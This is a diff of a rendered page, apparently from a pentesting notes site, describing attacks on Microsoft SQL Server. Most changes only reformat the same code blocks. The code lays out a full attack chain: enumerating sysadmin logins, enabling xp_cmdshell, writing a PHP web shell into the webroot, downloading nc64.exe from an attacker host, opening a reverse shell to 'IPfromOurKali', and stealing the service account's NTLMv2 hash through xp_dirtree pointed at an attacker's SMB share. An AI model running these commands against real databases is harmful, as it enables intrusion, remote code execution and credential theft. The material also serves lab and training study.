+<span class="normal"><a href="#__codelineno-8-19">19</a></span>
+<span class="normal"><a href="#__codelineno-8-20">20</a></span>
+<span class="normal"><a href="#__codelineno-8-21">21</a></span>
+<span class="normal"><a href="#__codelineno-8-22">22</a></span>
+<span class="normal"><a href="#__codelineno-8-23">23</a></span>
+<span class="normal"><a href="#__codelineno-8-24">24</a></span>
+<span class="normal"><a href="#__codelineno-8-25">25</a></span>
+<span class="normal"><a href="#__codelineno-8-26">26</a></span>
+<span class="normal"><a href="#__codelineno-8-27">27</a></span>
+<span class="normal"><a href="#__codelineno-8-28">28</a></span>
+<span class="normal"><a href="#__codelineno-8-29">29</a></span>
+<span class="normal"><a href="#__codelineno-8-30">30</a></span>
+<span class="normal"><a href="#__codelineno-8-31">31</a></span>
+<span class="normal"><a href="#__codelineno-8-32">32</a></span>
+<span class="normal"><a href="#__codelineno-8-33">33</a></span>
+<span class="normal"><a href="#__codelineno-8-34">34</a></span>
+<span class="normal"><a href="#__codelineno-8-35">35</a></span>
+<span class="normal"><a href="#__codelineno-8-36">36</a></span>
+<span class="normal"><a href="#__codelineno-8-37">37</a></span>
+<span class="normal"><a href="#__codelineno-8-38">38</a></span>
+<span class="normal"><a href="#__codelineno-8-39">39</a></span>
+<span class="normal"><a href="#__codelineno-8-40">40</a></span>
+<span class="normal"><a href="#__codelineno-8-41">41</a></span>
+<span class="normal"><a href="#__codelineno-8-42">42</a></span>
+<span class="normal"><a href="#__codelineno-8-43">43</a></span>
+<span class="normal"><a href="#__codelineno-8-44">44</a></span>
+<span class="normal"><a href="#__codelineno-8-45">45</a></span>
+<span class="normal"><a href="#__codelineno-8-46">46</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a># Get Microsoft SQL server version
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2"></a>select @@version;
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3"></a>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4"></a># Get usernames
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5"></a>select user_name()
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6"></a>go 
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7"></a>
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8"></a># We need to use GO after our query to execute the SQL syntax. 
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9"></a># List databases
+</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10"></a>SELECT name FROM master.dbo.sysdatabases
+</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11"></a>go
+</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12"></a>
+</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13"></a># Select a database
+</span><span id="__span-8-14"><a id="__codelineno-8-14" name="__codelineno-8-14"></a>USE $dbName
+</span><span id="__span-8-15"><a id="__codelineno-8-15" name="__codelineno-8-15"></a>go
+</span><span id="__span-8-16"><a id="__codelineno-8-16" name="__codelineno-8-16"></a>## Examples: Select a database master
+</span><span id="__span-8-17"><a id="__codelineno-8-17" name="__codelineno-8-17"></a>## USE master
+</span><span id="__span-8-18"><a id="__codelineno-8-18" name="__codelineno-8-18"></a>
+</span><span id="__span-8-19"><a id="__codelineno-8-19" name="__codelineno-8-19"></a># Check out which one is the current selected database
+</span><span id="__span-8-20"><a id="__codelineno-8-20" name="__codelineno-8-20"></a>SELECT DB_NAME()
+</span><span id="__span-8-21"><a id="__codelineno-8-21" name="__codelineno-8-21"></a>go
+</span><span id="__span-8-22"><a id="__codelineno-8-22" name="__codelineno-8-22"></a>
+</span><span id="__span-8-23"><a id="__codelineno-8-23" name="__codelineno-8-23"></a># Show tables
+</span><span id="__span-8-24"><a id="__codelineno-8-24" name="__codelineno-8-24"></a>SELECT table_name FROM $dbName.INFORMATION_SCHEMA.TABLES
+</span><span id="__span-8-25"><a id="__codelineno-8-25" name="__codelineno-8-25"></a>go
+</span><span id="__span-8-26"><a id="__codelineno-8-26" name="__codelineno-8-26"></a>
+</span><span id="__span-8-27"><a id="__codelineno-8-27" name="__codelineno-8-27"></a># Select a database and show content of a specific table.  
+</span><span id="__span-8-28"><a id="__codelineno-8-28" name="__codelineno-8-28"></a>USE $dbName
+</span><span id="__span-8-29"><a id="__codelineno-8-29" name="__codelineno-8-29"></a>SELECT * FROM $tableName 
+</span><span id="__span-8-30"><a id="__codelineno-8-30" name="__codelineno-8-30"></a>
+</span><span id="__span-8-31"><a id="__codelineno-8-31" name="__codelineno-8-31"></a># Example: Select all Data from Table &quot;users&quot;. The name of the table (&quot;users&quot;) was obtained when running the command for showing the tables.
+</span><span id="__span-8-32"><a id="__codelineno-8-32" name="__codelineno-8-32"></a>SELECT * FROM users
+</span><span id="__span-8-33"><a id="__codelineno-8-33" name="__codelineno-8-33"></a>go
+</span><span id="__span-8-34"><a id="__codelineno-8-34" name="__codelineno-8-34"></a>
+</span><span id="__span-8-35"><a id="__codelineno-8-35" name="__codelineno-8-35"></a># Get a list of users in the domain
+</span><span id="__span-8-36"><a id="__codelineno-8-36" name="__codelineno-8-36"></a>SELECT name FROM master..syslogins
+</span><span id="__span-8-37"><a id="__codelineno-8-37" name="__codelineno-8-37"></a>go
+</span><span id="__span-8-38"><a id="__codelineno-8-38" name="__codelineno-8-38"></a>
+</span><span id="__span-8-39"><a id="__codelineno-8-39" name="__codelineno-8-39"></a># Get a list of users that are sysadmins
+</span><span id="__span-8-40"><a id="__codelineno-8-40" name="__codelineno-8-40"></a>SELECT name FROM master..syslogins WHERE sysadmin = 1
+</span><span id="__span-8-41"><a id="__codelineno-8-41" name="__codelineno-8-41"></a>go
+</span><span id="__span-8-42"><a id="__codelineno-8-42" name="__codelineno-8-42"></a>
+</span><span id="__span-8-43"><a id="__codelineno-8-43" name="__codelineno-8-43"></a># And to make sure: 
+</span><span id="__span-8-44"><a id="__codelineno-8-44" name="__codelineno-8-44"></a>SELECT is_srvrolemember(&#39;sysadmin&#39;)
+</span><span id="__span-8-45"><a id="__codelineno-8-45" name="__codelineno-8-45"></a>go
+</span><span id="__span-8-46"><a id="__codelineno-8-46" name="__codelineno-8-46"></a># If your user is admin, it will return 1.
+</span></code></pre></div></td></tr></table></div>
 <p>Also, you might be interested in executing a cmd shell using xp_cmdshell by reconfiguring sp_configure (see the section <code>Executing cmd shell in a SQL command line</code>).</p>
 <h3 id="write-files-using-mssql">Write files using MSSQL</h3>
 <p>To write files using MSSQL, we need to enable Ole Automation Procedures, which requires admin privileges, and then execute some stored procedures to create the file:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>sp_configure &#39;show advanced options&#39;, 1;
-</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>RECONFIGURE;
-</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>sp_configure &#39;Ole Automation Procedures&#39;, 1;
-</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>RECONFIGURE;
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1">1</a></span>
+<span class="normal"><a href="#__codelineno-9-2">2</a></span>
+<span class="normal"><a href="#__codelineno-9-3">3</a></span>
+<span class="normal"><a href="#__codelineno-9-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a>sp_configure &#39;show advanced options&#39;, 1;
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2"></a>RECONFIGURE;
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3"></a>sp_configure &#39;Ole Automation Procedures&#39;, 1;
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4"></a>RECONFIGURE;
+</span></code></pre></div></td></tr></table></div>
 <h3 id="create-files-using-mssql">Create files using MSSQL</h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a># Using MSSQL to Create a File
-</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>DECLARE @OLE INT;
-</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>DECLARE @FileID INT;
-</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>EXECUTE sp_OACreate &#39;Scripting.FileSystemObject&#39;, @OLE OUT;
-</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>EXECUTE sp_OAMethod @OLE, &#39;OpenTextFile&#39;, @FileID OUT, &#39;c:\inetpub\wwwroot\webshell.php&#39;, 8, 1;
-</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>EXECUTE sp_OAMethod @FileID, &#39;WriteLine&#39;, Null, &#39;&lt;?php echo shell_exec($_GET[&quot;c&quot;]);?&gt;&#39;;
-</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>EXECUTE sp_OADestroy @FileID;
-</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>EXECUTE sp_OADestroy @OLE;
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1">1</a></span>
+<span class="normal"><a href="#__codelineno-10-2">2</a></span>
+<span class="normal"><a href="#__codelineno-10-3">3</a></span>
+<span class="normal"><a href="#__codelineno-10-4">4</a></span>
+<span class="normal"><a href="#__codelineno-10-5">5</a></span>
+<span class="normal"><a href="#__codelineno-10-6">6</a></span>
+<span class="normal"><a href="#__codelineno-10-7">7</a></span>
+<span class="normal"><a href="#__codelineno-10-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1"></a># Using MSSQL to Create a File
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2"></a>DECLARE @OLE INT;
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3"></a>DECLARE @FileID INT;
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4"></a>EXECUTE sp_OACreate &#39;Scripting.FileSystemObject&#39;, @OLE OUT;
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5"></a>EXECUTE sp_OAMethod @OLE, &#39;OpenTextFile&#39;, @FileID OUT, &#39;c:\inetpub\wwwroot\webshell.php&#39;, 8, 1;
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6"></a>EXECUTE sp_OAMethod @FileID, &#39;WriteLine&#39;, Null, &#39;&lt;?php echo shell_exec($_GET[&quot;c&quot;]);?&gt;&#39;;
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7"></a>EXECUTE sp_OADestroy @FileID;
+</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8"></a>EXECUTE sp_OADestroy @OLE;
+</span></code></pre></div></td></tr></table></div>
 <h3 id="read-files-using-mssql">Read files using MSSQL</h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>SELECT * FROM OPENROWSET(BULK N&#39;C:/Windows/System32/drivers/etc/hosts&#39;, SINGLE_CLOB) AS Contents
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1"></a>SELECT * FROM OPENROWSET(BULK N&#39;C:/Windows/System32/drivers/etc/hosts&#39;, SINGLE_CLOB) AS Contents
+</span></code></pre></div></td></tr></table></div>
 <h2 id="attacks">Attacks</h2>
 <h3 id="executing-cmd-shell-in-a-sql-command-line">Executing cmd shell in a SQL command line</h3>
 <p>Our goal can be to spawn a Windows command shell and pass in a string for execution. For that Microsoft SQL syntaxis has the command <strong>xp_cmdshell</strong>, that will allow us to use the SQL command line as a CLI. </p>
 <p>Because malicious users sometimes attempt to elevate their privileges by using xp_cmdshell, xp_cmdshell is disabled by default.  <code>xp_cmdshell</code> can be enabled and disabled by using the <a href="https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration">Policy-Based Management</a> or by executing <a href="https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option">sp_configure</a></p>
 <p><strong>sp_configure</strong> displays or changes global configuration settings for the current settings. This is how you may take advantage of it:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a># To allow advanced options to be changed.   
-</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>EXECUTE sp_configure &#39;show advanced options&#39;, 1
-</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>go
-</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>
-</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a># To update the currently configured value for advanced options.  
-</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>RECONFIGURE
-</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>go
-</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>
-</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a># To enable the feature.  
-</span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a>EXECUTE sp_configure &#39;xp_cmdshell&#39;, 1
-</span><span id="__span-12-11"><a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a>go
-</span><span id="__span-12-12"><a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a>
-</span><span id="__span-12-13"><a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a># To update the currently configured value for this feature.  
-</span><span id="__span-12-14"><a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a>RECONFIGURE
-</span><span id="__span-12-15"><a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a>go
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-12-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-12-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-12-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-12-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-12-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-12-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-12-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-12-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-12-10">10</a></span>
+<span class="normal"><a href="#__codelineno-12-11">11</a></span>
+<span class="normal"><a href="#__codelineno-12-12">12</a></span>
+<span class="normal"><a href="#__codelineno-12-13">13</a></span>
+<span class="normal"><a href="#__codelineno-12-14">14</a></span>
+<span class="normal"><a href="#__codelineno-12-15">15</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1"></a># To allow advanced options to be changed.   
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2"></a>EXECUTE sp_configure &#39;show advanced options&#39;, 1
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3"></a>go
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4"></a>
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5"></a># To update the currently configured value for advanced options.  
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6"></a>RECONFIGURE
+</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7"></a>go
+</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8"></a>
+</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9"></a># To enable the feature.  
+</span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10"></a>EXECUTE sp_configure &#39;xp_cmdshell&#39;, 1
+</span><span id="__span-12-11"><a id="__codelineno-12-11" name="__codelineno-12-11"></a>go
+</span><span id="__span-12-12"><a id="__codelineno-12-12" name="__codelineno-12-12"></a>
+</span><span id="__span-12-13"><a id="__codelineno-12-13" name="__codelineno-12-13"></a># To update the currently configured value for this feature.  
+</span><span id="__span-12-14"><a id="__codelineno-12-14" name="__codelineno-12-14"></a>RECONFIGURE
+</span><span id="__span-12-15"><a id="__codelineno-12-15" name="__codelineno-12-15"></a>go
+</span></code></pre></div></td></tr></table></div>
 <blockquote>
 <p>Note:  The Windows process spawned by <code>xp_cmdshell</code> has the same security rights as the SQL Server service account</p>
 </blockquote>
 <p>Now we can use the MSSQL terminal to execute commands:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a># Who am i?
-</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>xp_cmdshell &#39;whoami&#39;
-</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>go
-</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>
-</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a># This will return the .exe files existing in the current directory
-</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>EXEC xp_cmdshell &#39;dir *.exe&#39;
-</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>go
-</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>
-</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a># To print a file
-</span><span id="__span-13-10"><a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a>EXECUTE xp_cmdshell &#39;type c:\Users\sql_svc\Desktop\user.txt
-</span><span id="__span-13-11"><a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a>go
-</span><span id="__span-13-12"><a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a>
-</span><span id="__span-13-13"><a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a># With this (and a &quot;python3 -m http.server 80&quot; from our kali serving a file) we can upload a file to the attacked machine, for instance a reverse shell like nc64.exe
-</span><span id="__span-13-14"><a id="__codelineno-13-14" name="__codelineno-13-14" href="#__codelineno-13-14"></a>xp_cmdshell &quot;powershell -c cd C:\Users\sql_svc\Downloads; wget http://IPfromOurKali/nc64.exe -outfile nc64.exe&quot;
-</span><span id="__span-13-15"><a id="__codelineno-13-15" name="__codelineno-13-15" href="#__codelineno-13-15"></a>go
-</span><span id="__span-13-16"><a id="__codelineno-13-16" name="__codelineno-13-16" href="#__codelineno-13-16"></a>
-</span><span id="__span-13-17"><a id="__codelineno-13-17" name="__codelineno-13-17" href="#__codelineno-13-17"></a># We could also bind this cmd.exe through the nc to our listener. For that open a different tab in kali and do a &quot;nc -lnvp 443&quot;. When launching the reverse shell, we&#39;ll get a powershell terminal in this tab by running:
-</span><span id="__span-13-18"><a id="__codelineno-13-18" name="__codelineno-13-18" href="#__codelineno-13-18"></a>xp_cmdshell &quot;powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe IPfromOurKali 443&quot;;
-</span><span id="__span-13-19"><a id="__codelineno-13-19" name="__codelineno-13-19" href="#__codelineno-13-19"></a># You could also upload winPEAS and run it from this powershell command line
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-13-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-13-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-13-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-13-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-13-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-13-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-13-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-13-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-13-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-13-10">10</a></span>
+<span class="normal"><a href="#__codelineno-13-11">11</a></span>
+<span class="normal"><a href="#__codelineno-13-12">12</a></span>
+<span class="normal"><a href="#__codelineno-13-13">13</a></span>
+<span class="normal"><a href="#__codelineno-13-14">14</a></span>
+<span class="normal"><a href="#__codelineno-13-15">15</a></span>
+<span class="normal"><a href="#__codelineno-13-16">16</a></span>
+<span class="normal"><a href="#__codelineno-13-17">17</a></span>
+<span class="normal"><a href="#__codelineno-13-18">18</a></span>
+<span class="normal"><a href="#__codelineno-13-19">19</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1"></a># Who am i?
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2"></a>xp_cmdshell &#39;whoami&#39;
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3"></a>go
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4"></a>
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5"></a># This will return the .exe files existing in the current directory
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6"></a>EXEC xp_cmdshell &#39;dir *.exe&#39;
+</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7"></a>go
+</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8"></a>
+</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9"></a># To print a file
+</span><span id="__span-13-10"><a id="__codelineno-13-10" name="__codelineno-13-10"></a>EXECUTE xp_cmdshell &#39;type c:\Users\sql_svc\Desktop\user.txt
+</span><span id="__span-13-11"><a id="__codelineno-13-11" name="__codelineno-13-11"></a>go
+</span><span id="__span-13-12"><a id="__codelineno-13-12" name="__codelineno-13-12"></a>
+</span><span id="__span-13-13"><a id="__codelineno-13-13" name="__codelineno-13-13"></a># With this (and a &quot;python3 -m http.server 80&quot; from our kali serving a file) we can upload a file to the attacked machine, for instance a reverse shell like nc64.exe
+</span><span id="__span-13-14"><a id="__codelineno-13-14" name="__codelineno-13-14"></a>xp_cmdshell &quot;powershell -c cd C:\Users\sql_svc\Downloads; wget http://IPfromOurKali/nc64.exe -outfile nc64.exe&quot;
+</span><span id="__span-13-15"><a id="__codelineno-13-15" name="__codelineno-13-15"></a>go
+</span><span id="__span-13-16"><a id="__codelineno-13-16" name="__codelineno-13-16"></a>
+</span><span id="__span-13-17"><a id="__codelineno-13-17" name="__codelineno-13-17"></a># We could also bind this cmd.exe through the nc to our listener. For that open a different tab in kali and do a &quot;nc -lnvp 443&quot;. When launching the reverse shell, we&#39;ll get a powershell terminal in this tab by running:
+</span><span id="__span-13-18"><a id="__codelineno-13-18" name="__codelineno-13-18"></a>xp_cmdshell &quot;powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe IPfromOurKali 443&quot;;
+</span><span id="__span-13-19"><a id="__codelineno-13-19" name="__codelineno-13-19"></a># You could also upload winPEAS and run it from this powershell command line
+</span></code></pre></div></td></tr></table></div>
 <p>There are other methods to get command execution, such as adding <a href="https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server">extended stored procedures</a>, <a href="https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration">CLR Assemblies</a>, <a href="https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15">SQL Server Agent Jobs</a>, and <a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql">external scripts</a>.</p>
 <h3 id="capture-mssql-service-hash">Capture MSSQL Service Hash</h3>
 <p>We can steal the MSSQL service account hash using <code>xp_subdirs</code> or <code>xp_dirtree</code> undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system.</p>
 <p>When we use one of these stored procedures and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server.</p>
 <p><strong>1.</strong> First, start <a href="../responder/">Responder</a> or <a href="../smbserver/">smbserver from impacket</a>.</p>
 <p><strong>2.</strong> Run:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a># For XP_DIRTREE Hash Stealing
-</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>EXEC master..xp_dirtree &#39;\\$KaliIP\share\&#39;
-</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>
-</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a># For XP_SUBDIRS Hash Stealing
-</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>EXEC master..xp_subdirs &#39;\\$KaliIP\share\
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-14-1">1</a></span>
+<span class="normal"><a href="#__codelineno-14-2">2</a></span>
+<span class="normal"><a href="#__codelineno-14-3">3</a></span>
+<span class="normal"><a href="#__codelineno-14-4">4</a></span>
+<span class="normal"><a href="#__codelineno-14-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1"></a># For XP_DIRTREE Hash Stealing
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2"></a>EXEC master..xp_dirtree &#39;\\$KaliIP\share\&#39;
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3"></a>
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4"></a># For XP_SUBDIRS Hash Stealing
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5"></a>EXEC master..xp_subdirs &#39;\\$KaliIP\share\
+</span></code></pre></div></td></tr></table></div>
 <p>If the service account has access to our server, we will obtain its hash. We can then attempt to crack the hash or relay it to another host.</p>
 <p><strong>3.</strong> XP_SUBDIRS Hash Stealing with Responder</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="go">sudo responder -I tun0</span>
-</span></code></pre></div>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-15-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1"></a><span class="go">sudo responder -I tun0</span>
+</span></code></pre></div></td></tr></table></div>
 <p><strong>4.</strong> XP_SUBDIRS Hash Stealing with impacket</p>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="go">sudo impacket-smbserver share ./ -smb2support</span>
-</span></code></pre></div>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-16-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1"></a><span class="go">sudo impacket-smbserver share ./ -smb2support</span>
+</span></code></pre></div></td></tr></table></div>
 <h3 id="impersonate-existing-users-with-mssql">Impersonate Existing Users with MSSQL</h3>
